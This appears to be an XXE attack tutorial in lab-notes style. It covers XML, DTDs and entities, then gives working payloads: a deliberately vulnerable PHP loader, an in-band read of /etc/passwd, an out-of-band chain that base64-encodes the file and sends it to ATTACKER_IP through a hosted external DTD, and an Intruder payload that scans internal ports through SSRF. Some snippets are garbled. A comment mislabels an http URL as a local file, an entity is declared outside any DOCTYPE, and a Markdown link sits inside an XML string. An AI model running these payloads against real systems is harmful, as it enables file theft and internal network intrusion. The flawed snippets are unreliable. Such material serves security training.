## 🧱 XML Architecture and Syntax


Extensible Markup Language (XML) is an SGML-derived markup language utilized for storing and transporting data in a structured, human-readable, and machine-parseable format. It relies on elements, attributes, and character data.

```xml
# Example of a standard XML document structure
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```
* Tool: Code Editor

XML is heavily implemented in web services, APIs (SOAP, REST), and application configuration files.

## 🔀 Extensible Stylesheet Language Transformations
Extensible Stylesheet Language Transformations (XSLT) format and transform XML documents. XSLT facilitates XML External Entity (XXE) attacks through the following mechanisms:

* Data Extraction: Harvesting sensitive data from XML structures.
* Entity Expansion: Expanding defined entities, including malicious external injections.
* Data Manipulation: Modifying existing data or injecting malicious payloads.
* Blind XXE: Executing external entity injections without direct server response reflection.

## 📋 Document Type Definitions
Document Type Definitions (DTDs) define the structural constraints, allowed elements, and relationships within an XML document. They handle validation and entity declarations. DTDs can be internal (using the `<!DOCTYPE` declaration) or external (referenced using the `SYSTEM` keyword).

```xml
# Internal DTD defining configuration file constraints
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
<!ELEMENT config (database)>
<!ELEMENT database (username, password)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
]>
<config>
</config>
```
* Tool: Code Editor

## 🧩 XML Entities
XML entities act as placeholders for data or code expanded during parsing.

* Internal Entities: Variables defining reusable content within the DTD.
* External Entities: References to content outside the XML document (files or URLs). Central to XXE attacks.
* Parameter Entities: Reusable structures within DTDs, defined with `%`.
* General Entities: Document content substitutions declared internally or externally.
* Character Entities: Representations of reserved XML characters (e.g., `&lt;` for `<`).

```xml
# External entity declaration referencing a local system file
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "[http://example.com/test.dtd](http://example.com/test.dtd)">
<config>
&external;
</config>
```
* Tool: Code Editor

## 🎯 In-Band XXE Exploitation
In-band XXE occurs when the injected entity's output is directly returned within the application's response. 

```php
# Vulnerable PHP script loading XML without disabling external entities
libxml_disable_entity_loader(false);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $xmlData = file_get_contents('php://input');
    $doc = new DOMDocument();
    $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
    echo "Thank you, " .$expandedContent . "! Your message has been received.";
}
```
* Tool: PHP Interpreter

By injecting an external entity into the `name` parameter, local file disclosure is achieved.

```xml
# Payload extracting /etc/passwd via the reflected name element
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```
* Tool: Burp Suite / Proxy Intercept

## 📈 XML Entity Expansion
XML Entity Expansion defines entities that recursively reference others or load excessively large datasets, leading to Denial of Service (DoS) or establishing vectors for external file referencing.

```xml
# Basic entity expansion payload
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```
* Tool: Burp Suite / Proxy Intercept

## 📡 Out-Of-Band XXE


Out-Of-Band (OOB) XXE is utilized when the application does not reflect entity output. Exfiltration is forced by making the target server issue an outbound request to an attacker-controlled endpoint.

```xml
# Initial OOB trigger payload to test for outbound network connectivity
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```
* Tool: Burp Suite / Proxy Intercept

To exfiltrate file contents, an external DTD (`sample.dtd`) is hosted on the attacker's server. It uses PHP filters to Base64 encode the target file, preventing syntax errors during transmission.

```xml
# External DTD payload (sample.dtd) using parameter entities for Base64 exfiltration
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```
* Tool: Malicious Web Server

The primary request is then modified to call the malicious external DTD.

```xml
# Execution payload calling the malicious external DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```
* Tool: Burp Suite / Proxy Intercept

## 🕵️ XXE to SSRF


XXE vulnerabilities can be leveraged to execute Server-Side Request Forgery (SSRF). The XML parser is weaponized to issue HTTP requests to internal network segments or loopback addresses to bypass firewalls and scan for open ports.

```xml
# Intruder payload for internal port scanning via XXE
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```
* Tool: Burp Intruder
